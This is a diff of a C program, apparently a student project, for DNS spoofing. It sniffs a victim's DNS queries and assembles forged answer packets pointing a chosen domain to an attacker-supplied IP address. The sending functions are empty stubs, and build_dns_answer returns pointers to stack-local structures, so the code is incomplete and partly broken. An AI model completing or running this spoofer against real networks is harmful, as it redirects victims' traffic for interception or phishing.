@@ -227,7 +227,8 @@ void handle_DNS(const char* packet) {
     header_info->url_query = url;
 
     if (strcmp(header_info->url_query, header_info->request) == 0) {
-        fprintf(stderr, "URL Match found\n");
+        //fprintf(stderr, "URL Match found\n");
+        build_response_packet(dnsquery);
     }
 }
 
@@ -305,65 +306,89 @@ struct ip build_ip_hdr() {
 
 struct udp_hdr build_udp_hdr() {
     struct udp_hdr udp;
-    
+
     udp.uh_sport = htons(53);
     udp.uh_dport = header_info->src_port;
-    udp.uh_ulen = htons(sizeof(struct udp_hdr) + sizeof(struct DNS_HEADER) + sizeof(struct dns_query) + sizeof(struct RES_RECORD));
+    udp.uh_ulen = htons(sizeof (struct udp_hdr) + sizeof (struct DNS_HEADER) + sizeof (struct dns_query) + sizeof (struct RES_RECORD));
     udp.uh_sum = 0;
-    udp.uh_sum = ipv4_checksum((uint16_t *) &udp, sizeof(struct udp_hdr));
-    
+    udp.uh_sum = ipv4_checksum((uint16_t *) & udp, sizeof (struct udp_hdr));
+
     return udp;
 }
 
-int build_dns_answer(struct DNS_HEADER *dns_hdr, char *answer) {
+struct dns_response build_dns_answer(struct dns_query *query) {
     unsigned int size = 0;
-    struct dns_query *dns_query;
+    struct DNS_HEADER dns_hdr;
+    struct dns_query dns_query;
+    struct RES_RECORD response;
+    struct R_DATA rdata;
+    struct dns_response dns_response;
     unsigned char ans[4];
 
     sscanf(header_info->response, "%d.%d.%d.%d", (int *) &ans[0], (int *) &ans[1], (int *) &ans[2], (int *) &ans[3]);
 
-    dns_query = (struct dns_query*) (((char*) dns_hdr) + sizeof (struct DNS_HEADER));
+    dns_hdr.id = (unsigned short) htons(getpid()); // ID
+    dns_hdr.qr = 1; // We give a response, Volgens RFC: (= query (0), or a response (1).)
+    dns_hdr.opcode = 0; // default
+    dns_hdr.aa = 0; //Not Authoritative,RFC: (= Authoritative Answer - this bit is valid in responses, and specifies that the responding name server is an authority for the domain name in question section.)
+    dns_hdr.tc = 0; // Not truncated
+    dns_hdr.rd = 1; // Enable recursion
+    dns_hdr.ra = 0; // Nameserver supports recursion?
+    dns_hdr.z = 0; //  RFC: (= Reserved for future use.  Must be zero in all queries and responses.)
+    dns_hdr.rcode = 0; // No error condition
+    dns_hdr.q_count = 0; // No questions!
+    dns_hdr.ad = 0; // How man resource records?
+    dns_hdr.cd = 0; // !checking
+    dns_hdr.ans_count = 1; // We give 1 answer
+    dns_hdr.auth_count = 0; // How many authority entries?
+    dns_hdr.add_count = 0; // How many resource entries?
 
-    dns_hdr->id = (unsigned short) htons(getpid()); // ID
-    dns_hdr->qr = 1; // We give a response, Volgens RFC: (= query (0), or a response (1).)
-    dns_hdr->opcode = 0; // default
-    dns_hdr->aa = 0; //Not Authoritative,RFC: (= Authoritative Answer - this bit is valid in responses, and specifies that the responding name server is an authority for the domain name in question section.)
-    dns_hdr->tc = 0; // Not truncated
-    dns_hdr->rd = 1; // Enable recursion
-    dns_hdr->ra = 0; // Nameserver supports recursion?
-    dns_hdr->z = 0; //  RFC: (= Reserved for future use.  Must be zero in all queries and responses.)
-    dns_hdr->rcode = 0; // No error condition
-    dns_hdr->q_count = 0; // No questions!
-    dns_hdr->ad = 0; // How man resource records?
-    dns_hdr->cd = 0; // !checking
-    dns_hdr->ans_count = 1; // We give 1 answer
-    dns_hdr->auth_count = 0; // How many authority entries?
-    dns_hdr->add_count = 0; // How many resource entries?
+    strcpy(dns_query.qclass, query->qclass);
+    dns_query.qname = query->qname;
+    //strcpy(dns_query.qname, query->qname);
+    strcpy(dns_query.qtype, query->qtype);
 
-    return size;
+    response.name = query->qname;
+    rdata._class = htons(1);
+    rdata.type = htons(1);
+    rdata.data_len = htons(4);
+    rdata.ttl = 30;
+    response.resource = &rdata;
+    memcpy(&response.rdata, ans, 4);
+
+    dns_response._hdr = &dns_hdr;
+    dns_response._query = &dns_query;
+    dns_response._response = &response;
+
+    return dns_response;
 }
 
-void build_response_packet() {
-    struct DNS_HEADER *dns_hdr;
+void build_response_packet(struct dns_query *query) {
+    struct dns_response _response;
     struct ip ip_hdr;
     struct udp_hdr udp;
 
     char datagram[DATAGRAM_SIZE];
     char *answer;
     unsigned int datagram_size;
-    
+
     ip_hdr = build_ip_hdr();
     udp = build_udp_hdr();
+    _response = build_dns_answer(query);
 
-//    memset(datagram, 0, DATAGRAM_SIZE);
+    //    memset(datagram, 0, DATAGRAM_SIZE);
 
-//    answer = datagram + sizeof (struct my_ip) + sizeof (struct udp_hdr);
+    //    answer = datagram + sizeof (struct my_ip) + sizeof (struct udp_hdr);
 
 
 }
 
-uint8_t* build_ether_frame(struct ip send_iphdr, struct udp_hdr udp, struct DNS_HEADER dns_hdr, struct RES_RECORD response_hdr) {
+void send_dns_answer(struct in_addr ip, u_short port ){
+    
+}
 
+uint8_t* build_ether_frame(struct ip send_iphdr, struct udp_hdr udp, struct dns_response dns) {
+    
 }
 
 /*
@@ -372,9 +397,6 @@ uint8_t* build_ether_frame(struct ip send_iphdr, struct udp_hdr udp, struct DNS_
 int main(int argc, char** argv) {
     char *filter = NULL; // PCAP Filter
     char *victim_ip = NULL; // Victim Machine
-    char *interface_name = NULL; // Network interface
-    char *request = NULL; // Domain in the Query
-    char *spoof_address = NULL; // Spoofed Address in the Answer
     int c, status;
 
     if (argc < 7) {
